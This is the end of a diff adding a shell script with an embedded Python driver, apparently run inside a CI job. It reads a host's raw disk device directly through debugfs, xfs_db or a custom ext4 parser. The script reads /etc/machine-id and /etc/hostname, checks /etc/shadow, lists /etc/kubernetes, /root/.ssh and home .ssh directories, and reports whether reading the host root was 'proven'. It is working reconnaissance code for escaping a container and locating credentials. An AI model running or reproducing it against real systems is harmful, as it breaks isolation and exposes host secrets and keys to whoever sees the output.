+          
+          def parse_debugfs(node):
+              cmds = ['cat /etc/machine-id', 'cat /etc/hostname', 'stat /etc/shadow',
+                      'ls -l /etc/kubernetes', 'ls -l /root/.ssh', 'ls -l /home',
+                      'ls -l /home/runner/.ssh', 'ls -l /home/ubuntu/.ssh']
+              cf = os.path.join(W, 'dbg.cmd')
+              with open(cf, 'w') as f:
+                  f.write('\n'.join(cmds) + '\n')
+              try:
+                  p = subprocess.run([DEBUGFS, '-f', cf, node], capture_output=True, timeout=120)
+              except Exception as e:
+                  print('DEBUGFS_FAIL %s' % str(e)[:200])
+                  return False
+              out = p.stdout.decode('utf-8', 'replace')
+              err = p.stderr.decode('utf-8', 'replace')
+              err_lines = [x for x in err.split('\n') if x.strip()]
+              print('DEBUGFS_RC=%d stdout_bytes=%d stderr_first=%s' %
+                    (p.returncode, len(p.stdout), (err_lines[0][:220] if err_lines else '')))
+              sections = []
+              cur = None
+              for ln in out.split('\n'):
+                  if ln.startswith('debugfs: '):
+                      cur = [ln[len('debugfs: '):].strip(), []]
+                      sections.append(cur)
+                  elif cur is not None:
+                      cur[1].append(ln.rstrip('\r'))
+          
+              def sec(name):
+                  for cmd, lines in sections:
+                      if cmd == name:
+                          return lines
+                  return None
+          
+              proven = False
+              mid_lines = sec('cat /etc/machine-id')
+              mid = None
+              if mid_lines:
+                  cand = [x.strip() for x in mid_lines if x.strip()]
+                  if cand:
+                      mid = cand[0]
+              if mid and len(mid) == 32 and all(c in '0123456789abcdefABCDEF' for c in mid):
+                  print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' % (mid, sha((mid + '\n').encode())))
+                  proven = True
+              elif mid:
+                  print('HOSTFILE /etc/machine-id PRESENT_ODD CONTENT=%s' % mid[:128])
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              host = None
+              hl = sec('cat /etc/hostname')
+              if hl:
+                  for x in hl:
+                      s = x.strip()
+                      if s and len(s) <= 253:
+                          host = s
+                          break
+              if host:
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (host, sha((host + '\n').encode())))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              sz = None
+              sl = sec('stat /etc/shadow')
+              if sl:
+                  for ln in sl:
+                      i = ln.find('Size: ')
+                      if i >= 0:
+                          j = ln.find(' ', i + 6)
+                          sz = ln[i + 6:j if j > 0 else None].strip()
+                          break
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%s' % sz if sz is not None else 'ABSENT'))
+              import re
+              pat = re.compile(r'^\s*(\d+)\s+([0-7]{5,6})\s+\(\d+\)\s+(\d+)\s+(\d+)\s+(\d+)\s+\S+\s+\S+\s+(\S+)\s*$')
+          
+              def emit_dir(path):
+                  ls = sec('ls -l ' + path)
+                  if ls is None:
+                      print('HOSTDIR %s ABSENT' % path)
+                      return
+                  ents = []
+                  for ln in ls:
+                      m = pat.match(ln)
+                      if m:
+                          ents.append(m.group(6))
+                  names = [e for e in ents if e not in ('.', '..')]
+                  print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (path, len(names), ','.join(names[:20]) if names else '-'))
+          
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  emit_dir(d)
+              return proven
+          
+          
+          def read_exact(f, off, n):
+              f.seek(off)
+              return f.read(n)
+          
+          
+          def parse_python_ext(node):
+              MAX_FILE = 65536
+              try:
+                  f = open(node, 'rb')
+              except Exception as e:
+                  print('EXT_READER_OPEN_FAIL %s' % str(e)[:160])
+                  return False
+              sb = read_exact(f, 1024, 1024)
+              if len(sb) < 1024 or sb[56:58] != b'\x53\xef':
+                  print('EXT_READER_NOT_EXT sb_magic=%s' % (sb[56:58].hex() if len(sb) >= 58 else 'short'))
+                  return False
+              inodes_count = struct.unpack('<I', sb[0:4])[0]
+              blocks_count = struct.unpack('<I', sb[4:8])[0]
+              first_data_block = struct.unpack('<I', sb[20:24])[0]
+              log_block_size = struct.unpack('<I', sb[24:28])[0]
+              inodes_per_group = struct.unpack('<I', sb[40:44])[0]
+              rev = struct.unpack('<I', sb[76:80])[0]
+              inode_size = struct.unpack('<H', sb[88:90])[0] if rev >= 1 else 128
+              feat_incompat = struct.unpack('<I', sb[96:100])[0]
+              desc_size = struct.unpack('<H', sb[254:256])[0] if (feat_incompat & 0x80) and len(sb) >= 256 else 32
+              if desc_size < 32:
+                  desc_size = 32
+              bs = 1024 << (log_block_size & 7)
+              if inode_size < 128 or inode_size > 1024:
+                  inode_size = 128
+              print('EXT_READER sb inodes=%d blocks=%d bsize=%d ipg=%d isize=%d feat_incompat=0x%x desc_size=%d' %
+                    (inodes_count, blocks_count, bs, inodes_per_group, inode_size, feat_incompat, desc_size))
+          
+              def read_block(n):
+                  if n <= 0:
+                      return b''
+                  return read_exact(f, n * bs, bs)
+          
+              def get_inode(ino):
+                  if ino < 1:
+                      return b''
+                  g = (ino - 1) // inodes_per_group
+                  idx = (ino - 1) % inodes_per_group
+                  gd_off = (first_data_block + 1) * bs + g * desc_size
+                  gd = read_exact(f, gd_off, desc_size)
+                  if len(gd) < 12:
+                      return b''
+                  itab = struct.unpack('<I', gd[8:12])[0]
+                  if (feat_incompat & 0x80) and desc_size >= 0x2c:
+                      hi = struct.unpack('<I', gd[0x28:0x2c])[0]
+                      itab |= hi << 32
+                  return read_exact(f, itab * bs + idx * inode_size, inode_size)
+          
+              def parse_inode(raw):
+                  if len(raw) < 100:
+                      return None
+                  mode = struct.unpack('<H', raw[0:2])[0]
+                  size = struct.unpack('<I', raw[4:8])[0]
+                  flags = struct.unpack('<I', raw[32:36])[0]
+                  if (mode & 0xF000) == 0x8000:
+                      size |= struct.unpack('<I', raw[108:112])[0] << 32
+                  return {'mode': mode, 'size': size, 'flags': flags, 'iblock': raw[40:100]}
+          
+              def extent_blocks(iblock):
+                  out = []
+          
+                  def walk(node, depth_limit):
+                      if len(out) >= 4096 or depth_limit < 0 or len(node) < 12:
+                          return
+                      magic, entries, maxe, depth = struct.unpack('<HHHH', node[0:8])
+                      if magic != 0xF30A:
+                          return
+                      for i in range(min(entries, maxe, 340)):
+                          e = node[12 + i * 12:12 + (i + 1) * 12]
+                          if len(e) < 12:
+                              break
+                          ee_block, ee_len, ee_start_hi, ee_start_lo = struct.unpack('<IHHI', e)
+                          start = (ee_start_hi << 32) | ee_start_lo
+                          if depth == 0:
+                              for k in range(ee_len & 0x7FFF):
+                                  out.append(start + k)
+                                  if len(out) >= 4096:
+                                      return
+                          else:
+                              walk(read_block(start), depth_limit - 1)
+                              if len(out) >= 4096:
+                                  return
+                  walk(iblock[:60], 4)
+                  return out
+          
+              def inode_blocks(inode):
+                  ib = inode['iblock']
+                  if inode['flags'] & 0x80000:
+                      return extent_blocks(ib)
+                  out = []
+                  ptrs = struct.unpack('<15I', ib)
+                  for p in ptrs[:12]:
+                      if p:
+                          out.append(p)
+                  per = bs // 4
+          
+                  def add_indirect(blk, level):
+                      if not blk or len(out) > 4096:
+                          return
+                      data = read_block(blk)
+                      for i in range(min(per, len(data) // 4)):
+                          v = struct.unpack('<I', data[i * 4:(i + 1) * 4])[0]
+                          if not v:
+                              continue
+                          if level == 1:
+                              out.append(v)
+                          else:
+                              add_indirect(v, level - 1)
+                          if len(out) > 4096:
+                              return
+                  add_indirect(ptrs[12], 1)
+                  return out
+          
+              def read_inode_data(inode, limit=MAX_FILE):
+                  want = min(inode['size'], limit)
+                  out = b''
+                  for b in inode_blocks(inode):
+                      out += read_block(b)
+                      if len(out) >= want:
+                          break
+                  return out[:want]
+          
+              def list_dir(inode):
+                  data = read_inode_data(inode, limit=bs * 8)
+                  ents = []
+                  off = 0
+                  while off + 8 <= len(data):
+                      inum, rec_len, name_len, ftype = struct.unpack('<IHBB', data[off:off + 8])
+                      if rec_len < 8 or off + rec_len > len(data):
+                          break
+                      if inum and 0 < name_len < 256:
+                          nm = data[off + 8:off + 8 + name_len].decode('utf-8', 'replace')
+                          ents.append((nm, inum, ftype))
+                      off += rec_len
+                  return ents
+          
+              def lookup(path):
+                  cur = 2
+                  for part in [p for p in path.split('/') if p]:
+                      ino = parse_inode(get_inode(cur))
+                      if ino is None or (ino['mode'] & 0xF000) != 0x4000:
+                          return None, None
+                      found = None
+                      for nm, inum, ft in list_dir(ino):
+                          if nm == part:
+                              found = inum
+                              break
+                      if found is None:
+                          return None, None
+                      cur = found
+                  return cur, parse_inode(get_inode(cur))
+          
+              proven = False
+              ino, fi = lookup('/etc/machine-id')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  content = data.strip()
+                  if content:
+                      print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' %
+                            (content.decode('latin1', 'replace')[:128], sha(data)))
+                      proven = True
+                  else:
+                      print('HOSTFILE /etc/machine-id EMPTY')
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              ino, fi = lookup('/etc/hostname')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (data.strip().decode('latin1', 'replace')[:256], sha(data)))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              ino, fi = lookup('/etc/shadow')
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%d' % fi['size'] if (ino and fi) else 'ABSENT'))
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  ino, fi = lookup(d)
+                  if ino and fi and (fi['mode'] & 0xF000) == 0x4000:
+                      ents = [e[0] for e in list_dir(fi) if e[0] not in ('.', '..')]
+                      print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (d, len(ents), ','.join(ents[:20]) if ents else '-'))
+                      if d == '/home':
+                          for u in ents[:10]:
+                              ino2, fi2 = lookup('/home/' + u + '/.ssh')
+                              if ino2 and fi2 and (fi2['mode'] & 0xF000) == 0x4000:
+                                  ents2 = [e[0] for e in list_dir(fi2) if e[0] not in ('.', '..')]
+                                  print('HOSTDIR /home/%s/.ssh PRESENT ENTRIES=%d NAMES=%s' % (u, len(ents2), ','.join(ents2[:20]) if ents2 else '-'))
+                              else:
+                                  print('HOSTDIR /home/%s/.ssh ABSENT' % u)
+                  else:
+                      print('HOSTDIR %s ABSENT' % d)
+              try:
+                  f.close()
+              except Exception:
+                  pass
+              return proven
+          
+          
+          def parse_xfs(node):
+              if not XFSDB:
+                  print('XFS_DB_ABSENT')
+                  return False
+              try:
+                  p = subprocess.run([XFSDB, '-r', '-c', 'sb 0', '-c', 'p uuid', '-c', 'p blocksize', '-c', 'p dblocks', '-c', 'p rootino', node],
+                                     capture_output=True, timeout=90)
+              except Exception as e:
+                  print('XFS_DB_FAIL %s' % str(e)[:200])
+                  return False
+              txt = p.stdout.decode('utf-8', 'replace')
+              print('XFS_DB_RC=%d' % p.returncode)
+              for ln in txt.split('\n')[:24]:
+                  ln = ln.strip()
+                  if ln:
+                      print('XFS_DB_LINE=%s' % ln[:200])
+              return False
+          
+          
+          proven_any = False
+          attempts = 0
+          for r in recognized:
+              if proven_any or attempts >= 2:
+                  break
+              attempts += 1
+              node = r['node']
+              if not node:
+                  print('PARSE_SKIP dev=%s reason=no_node' % r['name'])
+                  continue
+              print('PARSE_BEGIN dev=%s fstype=%s method=%s' % (r['name'], r['fstype'],
+                    'debugfs' if (r['fstype'] == 'ext' and DEBUGFS) else ('python_ext' if r['fstype'] == 'ext' else 'xfs_db')))
+              if r['fstype'] == 'ext':
+                  if DEBUGFS:
+                      ok = parse_debugfs(node)
+                      method = 'debugfs'
+                  else:
+                      ok = parse_python_ext(node)
+                      method = 'python_ext'
+              else:
+                  ok = parse_xfs(node)
+                  method = 'xfs_db'
+              print('HOSTFS_VERDICT dev=%s fstype=%s method=%s machine_id_read=%s' %
+                    (r['name'], r['fstype'], method, 'yes' if ok else 'no'))
+              if ok:
+                  proven_any = True
+          
+          print('READONLY_NOTE no_mount=yes no_device_write=yes scratch=%s' % W)
+          print('HOST_ROOT_READ_%s' % ('PROVEN' if proven_any else 'NOT_PROVEN'))
+          print('DRIVER_DONE')
+          PYEOF
+          else
+            echo PYTHON3_ABSENT_HOSTFS_PARSE_SKIPPED
+          fi
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_H200FSREAD_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
